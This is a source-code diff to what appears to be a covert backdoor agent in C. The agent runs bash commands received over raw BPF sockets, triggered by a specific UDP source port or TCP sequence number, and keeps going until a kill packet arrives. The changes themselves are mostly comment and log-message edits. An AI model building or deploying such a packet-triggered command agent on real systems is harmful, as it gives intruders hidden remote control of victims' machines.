@@ -48,6 +48,7 @@ int StartAgent()
         goto end;
     }
 
+    // continue running shell commands until recv kill packet
     while (AcceptPacket(sock, &packet_data) != EXIT_KILL_SERVER)
     {
         if (NULL == packet_data)
@@ -77,9 +78,9 @@ end:
 }
 
 /**
- * @brief Runs a command with bash
+ * @brief Runs a command with bash.
  * 
- * @param cmd command to run
+ * @param cmd command to run.
  * @return int EXIT_SUCCESS on success, EXIT_FAILURE on failure.
  */
 static int RunCommand(char* cmd)
@@ -87,7 +88,7 @@ static int RunCommand(char* cmd)
     int exit_code = EXIT_FAILURE;
     pid_t pid = 0;
 
-    printf("Running cmd %s\n", cmd);
+    printf("RUNNING CMD: %s\n\n", cmd);
 
     pid = fork();
 
@@ -117,6 +118,12 @@ end:
     return exit_code;
 }
 
+/**
+ * @brief Creates a raw UDP bpf socket that filters for UDP src port.
+ * 
+ * @param port UDP src port to filter for.
+ * @return int the file descriptor of the created socket, or -1 on failure.
+ */
 static int CreateUDPFilterSocket(uint16_t port)
 {
     int sock = -1;
@@ -155,8 +162,9 @@ static int CreateUDPFilterSocket(uint16_t port)
 }
 
 /**
- * @brief Create a TCP filter socket for port 4578.
+ * @brief Creates a raw TCP bpf socket that filters for TCP sequence number.
  * 
+ * @param sequence_number TCP sequence number to filter for.
  * @return int the file descriptor of the created socket, or -1 on failure.
  */
 static int CreateTCPFilterSocket(uint32_t sequence_number)
